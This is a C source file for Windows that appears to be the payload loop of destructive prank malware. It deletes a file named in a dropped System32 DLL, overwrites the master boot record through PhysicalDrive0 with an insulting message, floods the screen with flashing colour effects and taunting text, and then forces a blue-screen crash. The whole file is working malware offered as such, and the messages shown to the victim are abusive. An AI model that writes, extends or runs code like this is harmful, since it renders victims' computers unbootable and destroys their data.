#include "loop.h"
#include "gdi.h"
#include "tools.h"
#include <fileapi.h>
#include <wingdi.h>
#include <winuser.h>






VOID MalwareLoop(){
    static BOOL init = FALSE;
    if(init == FALSE){
        HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\Windows.UI.NtHal.dll", 
                GENERIC_READ | GENERIC_WRITE, 0, 
                NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(hFile != INVALID_HANDLE_VALUE){
            WCHAR file[512];
            BOOL result = ReadFile(hFile, file, 512, NULL, NULL);
            if(result){
                BOOL result = DeleteFileW(file);
                if(!result) {
                    WCHAR buff[612];
                    wsprintfW(buff, L"%s\n", file);
                    MessageBoxW(NULL, buff, L"something went wrong.........", MB_OK);
                }
                CloseHandle(hFile);
                DeleteFileW(L"C:\\Windows\\System32\\Windows.UI.NtHal.dll");
            }
            else{
                MessageBoxW(NULL, L"you're a smart fella aren't you", L"but are you smart enough??", 
                MB_OK);
            }
            init = TRUE;

        }  
        init = TRUE;
    }
    HANDLE hMasterBootRecord = CreateFileW(L"\\\\.\\PhysicalDrive0", 
                                GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                                NULL, OPEN_EXISTING, 0, 0);
    WriteFile(hMasterBootRecord, "I told you so, you are nothing but a worthless pest, and no you aren't superior to ANYONE, your IQ did NOTHING to make you a worthful human", 
            512, NULL, NULL);
    HBRUSH red = CreateSolidBrush(RGB(100, 0, 0));
    HBRUSH green = CreateSolidBrush(RGB(0, 100, 0));
    HBRUSH blue = CreateSolidBrush(RGB(0, 0, 100));
    int prevtime = timeGetTime();
    while(1){
        if (timeGetTime() - prevtime >= 60000) break;
        SelectObject(GDIReturnDC(), red);
        PatBlt(GDIReturnDC(), 0, 0, GDIReturnScreenX(), GDIReturnScreenY(), PATINVERT);
        SelectObject(GDIReturnDC(), green);
        PatBlt(GDIReturnDC(), 0, 0, GDIReturnScreenX(), GDIReturnScreenY(), PATINVERT);
        SelectObject(GDIReturnDC(), blue);
        PatBlt(GDIReturnDC(), 0, 0, GDIReturnScreenX(), GDIReturnScreenY(), PATINVERT);
    }
    DeleteObject(red);
    DeleteObject(green);
    DeleteObject(blue);
    prevtime = timeGetTime();
    while(1){
        if (timeGetTime() - prevtime >= 12000) break;
        MalDrawText(GDIReturnDC(), 10, 10, 20, L"Wheres your accomplishments anon? Where are they???", RGB(0, 255, 0));
        MalDrawText(GDIReturnDC(), 10, 60, 20, L"your \"high iq\" is a waste", RGB(0, 255, 0));
    }
    BlueScreenSystem();
}